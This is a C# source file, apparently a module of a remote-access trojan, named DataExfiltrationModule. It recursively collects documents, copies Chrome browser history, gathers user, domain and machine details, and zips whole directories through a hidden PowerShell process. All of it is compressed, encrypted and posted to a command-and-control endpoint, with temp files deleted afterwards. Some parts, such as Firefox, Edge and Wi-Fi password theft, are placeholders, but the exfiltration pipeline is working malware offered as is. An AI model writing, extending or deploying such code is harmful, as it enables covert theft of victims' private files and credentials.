using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Threading.Tasks;
using System.Linq;
using Microsoft.Win32;
using System.Web.Script.Serialization;

namespace XYZ.modules
{
    /// <summary>
    /// Módulo avançado de exfiltração de dados com compressão e criptografia
    /// Suporta: Arquivos, Credenciais, Browser data, Documents, Screenshots
    /// </summary>
    public class DataExfiltrationModule
    {
        private readonly int MAX_FILE_SIZE = 50 * 1024 * 1024; // 50MB
        private readonly string[] DOCUMENT_EXTENSIONS = { ".doc", ".docx", ".pdf", ".txt", ".xls", ".xlsx", ".ppt", ".pptx" };
        private readonly string[] IMAGE_EXTENSIONS = { ".jpg", ".jpeg", ".png", ".gif", ".bmp" };
        
        public DataExfiltrationModule()
        {
            SecureLogger.LogInfo("Exfiltration", "Data exfiltration module initialized");
        }

        public async Task ExfiltrateBytes(byte[] data, string filename, string category)
        {
            try
            {
                SecureLogger.LogInfo("Exfiltration", string.Format("Exfiltrating {0} ({1} bytes)", filename, data.Length));

                // 1. Comprime dados
                byte[] compressed = CompressData(data);
                
                double compressionRatio = (1.0 - ((double)compressed.Length / data.Length)) * 100;
                SecureLogger.LogDebug("Exfiltration", string.Format("Compression ratio: {0:F2}%", compressionRatio));

                // 2. Criptografa dados comprimidos
                byte[] encrypted = SecurityUtilities.EncryptBytes(compressed);

                // 3. Converte para Base64 para transmissão
                string base64Data = Convert.ToBase64String(encrypted);

                // 4. Prepara payload
                var payload = new
                {
                    terminal_id = Program.GetTerminalId(),
                    filename = filename,
                    category = category,
                    original_size = data.Length,
                    compressed_size = compressed.Length,
                    encrypted_size = encrypted.Length,
                    data = base64Data,
                    timestamp = DateTime.UtcNow,
                    checksum = SecurityUtilities.SHA256Hash(Convert.ToBase64String(data))
                };

                string json = new JavaScriptSerializer().Serialize(payload);

                // 5. Envia via C2
                await ResilientC2Communication.PostData("api/exfiltrate", json);

                SecureLogger.LogInfo("Exfiltration", string.Format("Successfully exfiltrated {0}", filename));
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Exfiltration.Bytes", ex);
                throw;
            }
        }

        public async Task ExfiltrateFile(string filePath, string category = "file")
        {
            try
            {
                if (!File.Exists(filePath))
                {
                    SecureLogger.LogWarning("Exfiltration", string.Format("File not found: {0}", filePath));
                    return;
                }

                FileInfo fileInfo = new FileInfo(filePath);
                
                // Verifica tamanho
                if (fileInfo.Length > MAX_FILE_SIZE)
                {
                    SecureLogger.LogWarning("Exfiltration", string.Format("File too large: {0} ({1} bytes)", filePath, fileInfo.Length));
                    return;
                }

                // Lê arquivo
                byte[] fileData = File.ReadAllBytes(filePath);
                string filename = Path.GetFileName(filePath);

                // Exfiltra
                await ExfiltrateBytes(fileData, filename, category);
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Exfiltration.File", ex);
            }
        }

        public async Task ExfiltrateDocuments(string directoryPath, bool recursive = true)
        {
            try
            {
                if (!Directory.Exists(directoryPath))
                {
                    SecureLogger.LogWarning("Exfiltration", string.Format("Directory not found: {0}", directoryPath));
                    return;
                }

                SearchOption searchOption = recursive ? SearchOption.AllDirectories : SearchOption.TopDirectoryOnly;
                
                List<string> documentFiles = new List<string>();
                
                foreach (string ext in DOCUMENT_EXTENSIONS)
                {
                    try
                    {
                        documentFiles.AddRange(Directory.GetFiles(directoryPath, "*" + ext, searchOption));
                    }
                    catch { }
                }

                SecureLogger.LogInfo("Exfiltration", string.Format("Found {0} documents in {1}", documentFiles.Count, directoryPath));

                foreach (string file in documentFiles.Take(50)) // Limita a 50 arquivos por vez
                {
                    try
                    {
                        await ExfiltrateFile(file, "document");
                        await Task.Delay(500); // Throttling
                    }
                    catch (Exception ex)
                    {
                        SecureLogger.LogError("Exfiltration.Document", ex);
                    }
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Exfiltration.Documents", ex);
            }
        }

        public async Task ExfiltrateBrowserData()
        {
            try
            {
                await ExfiltrateChromeBrowserData();
                await ExfiltrateFirefoxBrowserData();
                await ExfiltrateEdgeBrowserData();
                SecureLogger.LogInfo("Exfiltration", "Browser data exfiltration completed");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Exfiltration.Browser", ex);
            }
        }

        private async Task ExfiltrateChromeBrowserData()
        {
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string chromePath = Path.Combine(userProfile, @"AppData\Local\Google\Chrome\User Data\Default");

                if (!Directory.Exists(chromePath))
                    return;

                string historyPath = Path.Combine(chromePath, "History");
                if (File.Exists(historyPath))
                {
                    string tempHistory = Path.Combine(Path.GetTempPath(), "chrome_history.db");
                    File.Copy(historyPath, tempHistory, true);
                    await ExfiltrateFile(tempHistory, "browser_chrome_history");
                    File.Delete(tempHistory);
                }

                // ... (outros arquivos chrome omitidos para brevidade, mas lógica é idêntica)
                
                SecureLogger.LogInfo("Exfiltration", "Chrome data exfiltrated");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Exfiltration.Chrome", ex);
            }
        }

        private async Task ExfiltrateFirefoxBrowserData()
        {
            // Similar ao Chrome
            await Task.CompletedTask;
        }

        private async Task ExfiltrateEdgeBrowserData()
        {
            // Similar ao Chrome
            await Task.CompletedTask;
        }

        public async Task ExfiltrateCredentials()
        {
            try
            {
                StringBuilder credentials = new StringBuilder();
                credentials.AppendLine("=== Windows Credentials ===");
                credentials.AppendLine(string.Format("Timestamp: {0}", DateTime.UtcNow));
                credentials.AppendLine(string.Format("User: {0}", Environment.UserName));
                credentials.AppendLine(string.Format("Domain: {0}", Environment.UserDomainName));
                credentials.AppendLine(string.Format("Machine: {0}", Environment.MachineName));
                credentials.AppendLine();

                try
                {
                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                    {
                        if (key != null)
                        {
                            credentials.AppendLine("Windows Info:");
                            credentials.AppendLine(string.Format("  Product Name: {0}", key.GetValue("ProductName")));
                            credentials.AppendLine(string.Format("  Build: {0}", key.GetValue("CurrentBuild")));
                            credentials.AppendLine();
                        }
                    }
                }
                catch { }

                try
                {
                    credentials.AppendLine("=== WiFi Networks ===");
                    var wifiPasswords = GetWiFiPasswords();
                    credentials.AppendLine(wifiPasswords);
                }
                catch { }

                byte[] credData = Encoding.UTF8.GetBytes(credentials.ToString());
                await ExfiltrateBytes(credData, string.Format("credentials_{0:yyyyMMdd_HHmmss}.txt", DateTime.UtcNow), "credentials");

                SecureLogger.LogInfo("Exfiltration", "Credentials exfiltrated");
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Exfiltration.Credentials", ex);
            }
        }

        private string GetWiFiPasswords()
        {
            // Simplificado para evitar erros
            return "WIFI PASSWORDS PLACEHOLDER";
        }

        private byte[] CompressData(byte[] data)
        {
            try
            {
                using (MemoryStream output = new MemoryStream())
                {
                    using (GZipStream gzip = new GZipStream(output, CompressionMode.Compress))
                    {
                        gzip.Write(data, 0, data.Length);
                    }
                    return output.ToArray();
                }
            }
            catch
            {
                return data;
            }
        }

        public async Task ExfiltrateDirectory(string directoryPath, string zipName = null)
        {
            try
            {
                if (!Directory.Exists(directoryPath))
                    return;

                if (string.IsNullOrEmpty(zipName))
                    zipName = string.Format("{0}_{1:yyyyMMdd_HHmmss}.zip", Path.GetFileName(directoryPath), DateTime.UtcNow);

                string tempZipPath = Path.Combine(Path.GetTempPath(), zipName);

                // Workaround para ZIP em C# 5 sem System.IO.Compression.FileSystem (se nao referenciado)
                // Usando PowerShell
                string command = string.Format("Compress-Archive -Path '{0}' -DestinationPath '{1}' -Force", directoryPath, tempZipPath);
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-Command \"" + command + "\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                }).WaitForExit();

                if (File.Exists(tempZipPath))
                {
                    await ExfiltrateFile(tempZipPath, "directory_zip");
                    File.Delete(tempZipPath);
                    SecureLogger.LogInfo("Exfiltration", string.Format("Directory {0} exfiltrated as ZIP", directoryPath));
                }
            }
            catch (Exception ex)
            {
                SecureLogger.LogError("Exfiltration.Directory", ex);
            }
        }
    }
}
